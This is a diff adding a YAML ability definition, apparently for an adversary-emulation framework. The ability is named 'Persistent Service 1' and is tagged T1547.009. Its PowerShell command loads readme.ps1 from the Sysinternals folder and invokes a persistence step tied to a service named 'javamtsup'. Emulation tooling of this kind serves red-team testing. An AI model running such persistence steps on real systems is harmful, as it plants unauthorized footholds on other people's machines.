@@ -1,0 +1,53 @@
+ability_id: 9c75155e-21ab-4471-af16-45f3795a313c
+access: {}
+additional_info: {}
+buckets:
+- persistence
+delete_payload: true
+description: Leverage modified Sysinternals
+executors:
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: "Set-Location -path \"C:\\Program Files\\SysinternalsSuite\";\nif (get-service\
+    \ -name \"javamtsup\" -ErrorAction SilentlyContinue) {\n  write-host \"[*] Service\
+    \ already exists...Not running persistence step-1\";\n  exit 1;\n}\n\nif (Test-Path\
+    \ -path \"readme.ps1\") {\n  . .\\readme.ps1;\n  Invoke-Persistence -PersistStep\
+    \ 1;\n  write-host \"[+] Persistence 1 invoked.\";\n  exit 0;\n\n} else {\n  write-host\
+    \ \"[!] readme.ps1 not found.\";\n  exit 1;\n}"
+  language: null
+  name: psh
+  parsers: []
+  payloads: []
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: "Set-Location -path \"C:\\Program Files\\SysinternalsSuite\";\nif (get-service\
+    \ -name \"javamtsup\" -ErrorAction SilentlyContinue) {\n  write-host \"[*] Service\
+    \ already exists...Not running persistence step-1\";\n  exit 1;\n}\n\nif (Test-Path\
+    \ -path \"readme.ps1\") {\n  . .\\readme.ps1;\n  Invoke-Persistence -PersistStep\
+    \ 1;\n  write-host \"[+] Persistence 1 invoked.\";\n  exit 0;\n\n} else {\n  write-host\
+    \ \"[!] readme.ps1 not found.\";\n  exit 1;\n}"
+  language: null
+  name: pwsh
+  parsers: []
+  payloads: []
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+name: Persistent Service 1
+plugin: emu
+privilege: ''
+repeatable: false
+requirements: []
+singleton: false
+tactic: persistence
+technique_id: T1547.009
+technique_name: 'Boot or Logon Autostart Execution: Shortcut Modification'
